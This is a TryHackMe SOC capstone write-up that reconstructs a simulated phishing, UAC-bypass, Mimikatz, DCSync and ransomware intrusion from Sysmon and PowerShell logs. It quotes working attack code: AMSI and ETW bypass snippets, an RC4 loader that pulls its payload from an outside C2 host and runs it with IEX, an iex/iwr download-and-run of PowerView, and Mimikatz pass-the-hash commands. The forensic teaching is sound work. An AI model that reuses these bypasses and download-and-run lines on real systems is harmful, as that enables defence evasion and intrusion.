# TryHackMe Boogeyman 3 — Full Writeup

**Category:** DFIR / SOC Log Analysis | **Platform:** TryHackMe (SOC Level 1 Capstone) | **Stack:** Elastic/Kibana (Sysmon, PowerShell Operational, Windows Security) | **Target Org:** Quick Logistics LLC

---

## Synopsis

Boogeyman 3 is the final capstone in TryHackMe's SOC Level 1 path — no shell, no root flag, just a pre-recorded Elastic Stack full of Sysmon, PowerShell, and Windows Security logs from a real intrusion, and a list of questions that only get answered by reading them correctly. The scenario: an MSSP-monitored company gets hit again by the "Boogeyman" threat actor, starting with a spoofed-CFO phishing email to the CEO and ending in domain-wide credential theft and a ransomware deploy.

What makes this room worth writing up isn't the flags — it's the chain: a UAC bypass provable at the token level, a fileless PowerShell C2 stager that never spawns `powershell.exe`, hand-rolled AMSI/ETW bypasses, an RC4-encrypted second stage, and a Pass-the-Hash → DCSync → ransomware finish, all reconstructed purely from log correlation.

**Attack Chain:** Phishing (ISO/HTA) → UAC bypass (fodhelper) → fileless registry-based C2 stager (AMSI/ETW bypass, RC4) → Mimikatz LSASS dump + Pass-the-Hash → PowerView share enumeration → hardcoded creds on a share → WinRM lateral movement → DCSync on the DC → ransomware deploy

---

## Investigation Setup

- **Time window:** Aug 29–30, 2023 (given in the room brief)
- **Initial lead:** `ProjectFinancialSummary_Q3.pdf` — actually an ISO disk image containing an `.hta` file (`ProjectFinancialSummary_Q3.pdf.hta`), found in the CEO's Downloads folder after he reported a phishing email
- **Hosts involved:** `WKSTN-0051` (initial victim, CEO Evan Hutchinson) → `WKSTN-1327` (second workstation, Allan Smith) → `DC01` (domain controller)

First KQL query, scoped to the incident window and the known filename, immediately surfaces the whole stage-1 chain:

```
*ProjectFinancialSummary*
```

```
Aug 29, 2023 23:51:15.856  mshta.exe    "C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"
Aug 29, 2023 23:51:16.738  xcopy.exe    "xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\...\Temp\review.dat
Aug 29, 2023 23:51:16.771  rundll32.exe "rundll32.exe" D:\review.dat,DllRegisterServer
Aug 29, 2023 23:51:16.809  powershell.exe  ...New-ScheduledTask... -TaskName Review...
```

Four events, one query — PID 6392, the implant command, the execution command, and the scheduled-task persistence, all in a single 1-second window.

---

## Root Cause & Technique Breakdown

### UAC Bypass — fodhelper.exe registry hijack

`fodhelper.exe` carries `autoElevate=true` in its manifest — Windows trusts it to silently re-launch at **High integrity** with no consent prompt. It reads `HKCU\Software\Classes\ms-settings\Shell\Open\command` before elevating, and never validates what's sitting there. Since `HKCU` is writable by any standard user, the attacker sets that key to their payload, launches `fodhelper.exe` normally, and it executes the payload at High integrity instead.

Proof isn't just "fodhelper.exe showed up" — it's the Sysmon `winlog.event_data.IntegrityLevel` field jumping `Medium` (on the `whoami` pre-check) to `High` (on fodhelper's own process-create event, same logon session):

```
whoami.exe    IntegrityLevel: Medium   23:54:48
fodhelper.exe IntegrityLevel: High     23:54:49
```

### Fileless execution — no powershell.exe ever spawns

The DLL executed by `rundll32.exe D:\review.dat,DllRegisterServer` reflectively loads `System.Management.Automation.dll` — the actual PowerShell engine assembly — and hosts a runspace **inside its own process memory** instead of shelling out to `powershell.exe`. "Alert on anything spawning powershell.exe" is one of the most common detection rules in existence; this defeats it completely.

The tell that survives: Windows PowerShell Event ID 600 (`Provider '<X>' is Started` — FileSystem, Function, Variable, Environment) fires on every runspace init, tied to the **hosting process's own command line**, not `powershell.exe`:

```
Provider "FileSystem" is Started.
HostApplication = C:\Windows\System32\rundll32.exe D:\review.dat,DllRegisterServer
```

### Registry-based C2 stager + AMSI/ETW bypass

```powershell
$x = (gp HKCU:Software\Microsoft\Windows Update).Update
powershell -NoP -NonI -W Hidden -enc $x
```

Base64 payload parked in a registry value named to blend in (`Windows Update`), read and executed with `-enc` — no script file ever touches disk. Decoding `-EncodedCommand` payloads always needs the same two-step CyberChef recipe (**From Base64 → Decode text (UTF-16LE)** — PowerShell encodes as UTF-16LE before base64'ing), and the decoded script opens with a reflection-based AMSI bypass immediately followed by an ETW bypass:

```powershell
$Ref=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Ref.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue(
  [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null), 0)
```

### RC4-encrypted second stage

```powershell
$R={
  $D,$K=$Args; $S=0..255
  0..255 | %{ $J=($J+$S[$_]+$K[$_%$K.Count])%256; $S[$_],$S[$J]=$S[$J],$S[$_] }
  $D | %{ $I=($I+1)%256; $H=($H+$S[$I])%256; $S[$I],$S[$H]=$S[$H],$S[$I]; $_-bxor$S[($S[$I]+$S[$H])%256] }
}
-join[Char[]](& $R $data ($IV+$K)) | IEX
```

A hand-rolled RC4 (KSA + PRGA) decrypts a payload pulled from `http://cdn.bananapeelpapty.net/news.php` — resolving to the same C2 IP seen beaconing 257+ times over Sysmon Event ID 3 (`165.232.170.151:80`). Not just base64-hidden — actually encrypted, so a raw packet capture of the response shows binary noise, not a recognizable script.

The important pivot lesson: `IEX` runs the decrypted script **inside the current PowerShell process**. No new child PID. Walking `process.parent.pid` generation by generation goes cold here — the only way forward is following the *same* PID's later events in time.

### Mimikatz — LSASS dump, Pass-the-Hash, DCSync

```
sekurlsa::logonpasswords
sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe
```

Sysmon never captures a process's stdout — only its full command line. That's why the dump's *output* can't be recovered directly, but the **Pass-the-Hash hash is fully visible**: it's a command-line argument to `sekurlsa::pth`, and full arguments are always logged. That's the reusable lesson — a dumped secret becomes visible in Sysmon the moment it's *reused* as an input to something else, not when it's dumped.

`lsadump::dcsync` shows up twice later in the chain — once from a regular workstation, once from the DC itself — because DCSync is a directory-replication protocol call (DRSUAPI), not local execution. It never requires being physically on the domain controller, only Replicating Directory Changes rights and network reachability.

### Domain-wide share sweep → hardcoded credentials

```powershell
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb)
Invoke-ShareFinder
cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1
```

PowerView's `Invoke-ShareFinder` sweeps every reachable SMB share domain-wide. One of them holds an IT automation script — `IT_Automation.ps1` — with a plaintext credential hardcoded inside it: `QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987`. A real-world-shaped mistake: convenience creds left in an ops script on an open share.

### WinRM lateral movement — the wsmprovhost.exe fingerprint

```powershell
$credential = New-Object PSCredential (...)
Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}
```

Any command delivered via PowerShell Remoting lands on the **target** host with `wsmprovhost.exe` (the WinRM provider host) as its parent process — not `powershell.exe`, not `explorer.exe`. Confirmed twice in this intrusion: once for the loader push to `WKSTN-1327`, and again later for the ransomware binary's own execution (`wsmprovhost.exe -Embedding` → `ransomboogey.exe`). It's a clean, reliable discriminator between "attacker remoted in from elsewhere" and hands-on-keyboard local execution.

---

## Full Chain, Chronologically

```
WKSTN-0051  mshta.exe (ISO/HTA phishing) → xcopy implants DLL → rundll32.exe hosts PS engine in-process
            whoami/net localgroup administrators → fodhelper.exe UAC bypass (Medium→High, proven via IntegrityLevel)
            HKCU registry stager → AMSI+ETW bypass → RC4-decrypt from cdn.bananapeelpapty.net → IEX (same PID)
            mimikatz (github.com/gentilkiwi) → sekurlsa dump → sekurlsa::pth as itadmin
            PowerView Invoke-ShareFinder → cat IT_Automation.ps1 → harvests allan.smith:Tr!ckyP@ssw0rd987
WKSTN-1327  Invoke-Command (WinRM, parent=wsmprovhost.exe) → same RC4 loader → mimikatz sekurlsa/dcsync
DC01        lsadump::dcsync (administrator + backupda) → downloads + executes ransomboogey.exe via WinRM
```

---

## Credentials & Secrets Recovered

| Type | Value | Recovered via |
|---|---|---|
| Pass-the-Hash (itadmin) | `F84769D250EB95EB2D7D8B4A1C5613F2` | Command-line argument to `sekurlsa::pth`, not stdout |
| Harvested plaintext creds | `QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987` | Hardcoded in `IT_Automation.ps1` on an open share |
| WKSTN-1327 local dump | `administrator:00f80f2538dcb54e7adc715c0e7091ec` | mimikatz `sekurlsa` on second host |
| C2 infrastructure | `165.232.170.151:80` / `cdn.bananapeelpapty.net` | Sysmon Event ID 3, decoded domain string in RC4 loader |

---

## Key Takeaways

- **Sysmon captures full command-line arguments but never stdout.** A dumped credential's value is generally unrecoverable from process telemetry alone — the one reliable exception is when it's later *reused* as an input argument to another command.
- **`IEX`/reflective in-memory execution defeats process-tree pivoting.** No child PID appears — follow the same PID forward in time instead of expecting a child.
- **A narrow Kibana time-range window silently hides real events with no error** — looks identical to "the data isn't there." Check the range before doubting the query.
- **UAC bypass via auto-elevate binaries is provable at the token level**, not just by process name — the `IntegrityLevel` field jumping Medium→High on the bypass binary's own event is direct evidence.
- **`wsmprovhost.exe` as a parent process is a reliable WinRM/PSRemoting fingerprint**, distinguishing remote command delivery from hands-on-keyboard execution.
- **DCSync doesn't require presence on the domain controller** — it's a replication protocol call, reachable from any host with the right rights.
- **PowerShell `-EncodedCommand` is always UTF-16LE before base64** — the standard CyberChef recipe (`From Base64` → `Decode text (UTF-16LE)`) applies to every encoded blob, even nested inside an already-decoded script.
